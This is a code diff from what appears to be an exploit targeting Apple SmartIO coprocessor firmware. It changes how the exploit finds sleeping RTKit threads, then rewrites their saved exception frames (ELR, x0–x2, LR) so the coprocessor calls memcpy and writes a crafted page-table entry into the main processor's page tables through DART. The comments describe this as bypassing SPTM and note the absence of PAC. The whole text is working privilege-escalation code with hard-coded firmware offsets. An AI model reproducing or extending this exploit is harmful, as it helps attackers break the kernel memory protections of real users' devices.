@@ -254,64 +254,100 @@ find_sleeping_threads(struct rtk_thread_info *threads, int *count)
     *count = 0;
 
     /*
-     * Scan carveout for RTKSTACK watermark pattern.
-     * The watermark is "RTKSTACKRTKSTACK..." repeated.
+     * Two strategies to find sleeping thread exception frames:
      *
-     * When we find a watermark region, the thread's saved frame is
-     * typically just below it (at lower addresses). We read the frame
-     * to check if the thread is sleeping (PC points into a sleep/wait
-     * function).
+     * STRATEGY 1 (preferred): Read the RTKit thread list.
+     *   _rtk_thread_list at SmartIO VA 0x113560 (zerofill section).
+     *   _rtk_current_threads at SmartIO VA 0x1cfe0 (data section).
+     *   Each thread struct is 0xB0 bytes. thread+0x48 = frame pointer.
+     *   The frame pointer points to the exception frame on the thread's
+     *   stack (set when the thread last went through svc/irq save).
+     *   We access SmartIO memory via its MMIO mapping from the AP side.
+     *   The carveout physical base + SmartIO VA gives the AP physical addr.
+     *
+     * STRATEGY 2 (fallback): Scan carveout for RTKSTACK watermarks.
+     *   "RTKSTACK" (0x4B434154534B5452) is the stack guard pattern.
+     *   Stacks grow downward; the exception frame is below the watermark.
+     *   Less reliable but doesn't require knowing the thread list VA.
      */
-    fprintf(stderr, "[*] Scanning SmartIO carveout for sleeping RTKit threads...\n");
+
+    fprintf(stderr, "[*] Finding sleeping RTKit threads...\n");
     fprintf(stderr, "[*] Carveout: phys 0x%llx, size 0x%llx\n",
             smartio_carveout_phys, smartio_carveout_size);
 
-    uint64_t scan_end = smartio_carveout_phys + smartio_carveout_size;
+    /* Strategy 1: Walk thread list */
+    uint64_t thread_list_phys = smartio_carveout_phys + 0x113560;
+    uint64_t current_threads_phys = smartio_carveout_phys + 0x1cfe0;
 
-    for (uint64_t addr = smartio_carveout_phys;
-         addr < scan_end - 8 && *count < MAX_THREADS;
-         addr += 0x1000)   /* Scan page-aligned */
-    {
-        uint64_t val = kread64(addr);
-        if (val != RTKSTACK_WATERMARK)
+    for (int i = 0; i < MAX_THREADS && *count < MAX_THREADS; i++) {
+        uint64_t thread_phys = thread_list_phys + (i * RTK_THREAD_SIZE);
+
+        /* Read first word to check if thread entry is valid (non-zero) */
+        uint64_t thread_word0 = kread64(thread_phys);
+        if (thread_word0 == 0)
             continue;
 
-        /* Found watermark — verify it's a contiguous run */
-        uint64_t val2 = kread64(addr + 8);
-        if (val2 != RTKSTACK_WATERMARK)
+        /* Read frame pointer from thread+0x48 */
+        uint64_t frame_ptr = kread64(thread_phys + RTK_THREAD_FRAME_PTR);
+        if (frame_ptr == 0 || frame_ptr < 0x200)
             continue;
 
         /*
-         * Stack watermark found at addr. The saved frame is typically
-         * at the stack base, which is at a page-aligned address below
-         * the watermark region.
+         * frame_ptr is a SmartIO VA. Convert to AP physical:
+         *   phys = carveout_base + smartio_va
          *
-         * Read candidate context at (addr - RTK_CTX_SIZE) and check
-         * if the saved PC looks like a SmartIO firmware address.
+         * Read the saved ELR (return PC) from the exception frame.
+         * A sleeping thread's ELR points into firmware code.
          */
-        /*
-         * New approach: instead of scanning for frames below watermarks,
-         * read the thread list at _rtk_thread_list (VA 0x113560) and
-         * follow each thread's context pointer at thread+0x48.
-         *
-         * Fallback: scan for context structs by looking for the magic
-         * value 0x7777777777770077 at context+0xE8.
-         */
-        uint64_t frame_addr = addr - RTK_CTX_SIZE;
-        uint64_t saved_pc = kread64(frame_addr + RTK_CTX_PC_OFF);
-        uint64_t saved_x0 = kread64(frame_addr + RTK_CTX_X0_OFF);
+        uint64_t frame_phys = smartio_carveout_phys + frame_ptr;
+        uint64_t saved_elr = kread64(frame_phys + EXC_FRAME_ELR);
 
-        /* SmartIO firmware VA space: __TEXT 0x0-0x1c000, __DATA 0x1c000-0x114000 */
-        if (saved_pc < 0x1c000 && saved_pc > 0x200) {
-            threads[*count].stack_base_phys = addr;
-            threads[*count].frame_phys = frame_addr;
-            threads[*count].saved_pc = saved_pc;
-            threads[*count].saved_sp = saved_x0;  /* Repurposed field */
+        /* Validate: ELR should be in SmartIO __TEXT (0x200..0x1c000) */
+        if (saved_elr > 0x200 && saved_elr < 0x1c000) {
+            uint64_t saved_x0 = kread64(frame_phys + EXC_FRAME_X0);
+            uint64_t saved_sp = kread64(frame_phys + EXC_FRAME_ORIG_SP);
+
+            threads[*count].stack_base_phys = frame_phys + EXC_FRAME_SIZE_SVC;
+            threads[*count].frame_phys = frame_phys;
+            threads[*count].saved_pc = saved_elr;
+            threads[*count].saved_sp = saved_sp;
             threads[*count].is_sleeping = 1;
             (*count)++;
 
-            fprintf(stderr, "[+] Thread %d: frame@0x%llx PC=0x%llx SP=0x%llx\n",
-                    *count, frame_addr, saved_pc, saved_sp);
+            fprintf(stderr, "[+] Thread %d: frame@phys:0x%llx ELR=0x%llx SP=0x%llx\n",
+                    *count, frame_phys, saved_elr, saved_sp);
+        }
+    }
+
+    /* Strategy 2 fallback: scan for RTKSTACK watermarks */
+    if (*count == 0) {
+        fprintf(stderr, "[*] Thread list scan found 0 — trying watermark scan...\n");
+
+        uint64_t scan_end = smartio_carveout_phys + smartio_carveout_size;
+        for (uint64_t addr = smartio_carveout_phys;
+             addr < scan_end - 8 && *count < MAX_THREADS;
+             addr += 0x1000)
+        {
+            uint64_t val = kread64(addr);
+            if (val != RTKSTACK_WATERMARK)
+                continue;
+            if (kread64(addr + 8) != RTKSTACK_WATERMARK)
+                continue;
+
+            uint64_t frame_addr = addr - EXC_FRAME_SIZE_SVC;
+            uint64_t saved_elr = kread64(frame_addr + EXC_FRAME_ELR);
+
+            if (saved_elr > 0x200 && saved_elr < 0x1c000) {
+                threads[*count].stack_base_phys = addr;
+                threads[*count].frame_phys = frame_addr;
+                threads[*count].saved_pc = saved_elr;
+                threads[*count].saved_sp = kread64(frame_addr + EXC_FRAME_ORIG_SP);
+                threads[*count].is_sleeping = 1;
+                (*count)++;
+
+                fprintf(stderr, "[+] Thread %d (watermark): frame@0x%llx ELR=0x%llx\n",
+                        *count, frame_addr, saved_elr);
+            }
         }
     }
 
@@ -435,36 +471,59 @@ arm_sleeping_thread(struct rtk_thread_info *thread,
                     uint64_t src_smartio_va,  /* SmartIO VA → our PTE data */
                     uint64_t write_len)
 {
-    fprintf(stderr, "[*] Arming thread at frame 0x%llx\n", thread->frame_phys);
-    fprintf(stderr, "    PC: 0x%llx → memcpy @ 0x%x\n",
+    uint64_t frame = thread->frame_phys;
+
+    fprintf(stderr, "[*] Arming thread exception frame at phys 0x%llx\n", frame);
+    fprintf(stderr, "    Original ELR: 0x%llx → memcpy @ 0x%x\n",
             thread->saved_pc, SMARTIO_MEMCPY_VA);
-    fprintf(stderr, "    x0 (dst): 0x%llx\n", dst_smartio_va);
-    fprintf(stderr, "    x1 (src): 0x%llx\n", src_smartio_va);
+    fprintf(stderr, "    x0 (dst): 0x%llx (DART-mapped AP PTE page)\n", dst_smartio_va);
+    fprintf(stderr, "    x1 (src): 0x%llx (SmartIO-local PTE data)\n", src_smartio_va);
     fprintf(stderr, "    x2 (len): 0x%llx\n", write_len);
 
-    /* Write the armed context — using CONFIRMED offsets from disassembly */
-    kwrite64(thread->frame_phys + RTK_CTX_X0_OFF, dst_smartio_va);   /* x0 = memcpy dst */
-    kwrite64(thread->frame_phys + RTK_CTX_PC_OFF, SMARTIO_MEMCPY_VA); /* PC = memcpy */
-    kwrite64(thread->frame_phys + RTK_CTX_X2_OFF, write_len);         /* x2 = memcpy len */
+    /*
+     * CONFIRMED exception frame layout from firmware disassembly (2026-11-20):
+     *
+     * The sleeping thread's exception frame is on its stack.
+     * The scheduler's eret path at 0x7d68 restores ALL registers from this
+     * frame and jumps to ELR_EL1. No PAC authentication — SmartIO has zero
+     * PAC instructions.
+     *
+     * We overwrite:
+     *   [frame+0x100] = ELR_EL1 → _memcpy (0x87c8)
+     *   [frame+0x000] = x0 → memcpy dst (DART addr mapping to AP PTE page)
+     *   [frame+0x008] = x1 → memcpy src (SmartIO addr with crafted PTE)
+     *   [frame+0x010] = x2 → memcpy len (8 for one PTE)
+     *   [frame+0x0F0] = x30/LR → infinite loop (0x082c) for safe parking
+     *
+     * When eret fires: PC=memcpy, x0=dst, x1=src, x2=len.
+     * memcpy(dst, src, len) writes our crafted PTE through DART to the AP
+     * page-table physical page. SPTM doesn't intercept this because it's
+     * a DMA write from the coprocessor, not an AP CPU page table update.
+     * memcpy returns via LR → parks in infinite loop.
+     */
+
+    /* ELR_EL1: return address → _memcpy */
+    kwrite64(frame + EXC_FRAME_ELR, SMARTIO_MEMCPY_VA);
+
+    /* x0: memcpy destination (DART-mapped → AP page-table page) */
+    kwrite64(frame + EXC_FRAME_X0, dst_smartio_va);
+
+    /* x1: memcpy source (SmartIO-local buffer with our crafted PTE) */
+    kwrite64(frame + EXC_FRAME_X1, src_smartio_va);
+
+    /* x2: memcpy length (8 bytes = one 64-bit PTE) */
+    kwrite64(frame + EXC_FRAME_X2, write_len);
+
+    /* x30/LR: safe parking after memcpy returns */
+    kwrite64(frame + EXC_FRAME_LR, SMARTIO_INFLOOP_VA);
 
     /*
-     * x1 (memcpy src) offset needs runtime verification.
-     * In initial thread setup, context+0x08 = PC. During context switch,
-     * x1 may be at a different offset. Write to context+0x18 as candidate
-     * (3rd qword after x0 at +0x00, PC at +0x08, x2 at +0x10).
-     * TODO: Verify by reading a running thread's saved context.
-     */
-    kwrite64(thread->frame_phys + 0x18, src_smartio_va);  /* x1 = memcpy src (PROVISIONAL) */
-
-    /*
-     * LR (x30): set to infinite loop so thread parks safely after memcpy.
-     * memcpy's prologue saves x29/x30 to stack and epilogue does
-     * "ldp x29, x30, [sp], #0x10; ret", so LR must be in a valid location.
-     * We write the infloop gadget to context+0x08 as well, since on resume
-     * PC=memcpy, and memcpy's ret will use the LR it saved on entry.
-     * Alternative: write infloop to the thread's stack at saved SP.
+     * SPSR_EL1: keep the original value. The thread was running at EL1
+     * when it did svc #0, so SPSR already encodes the correct state.
+     * Overwriting it could cause an exception on eret.
      */
 
+    fprintf(stderr, "[+] Exception frame armed successfully\n");
     return 0;
 }
 
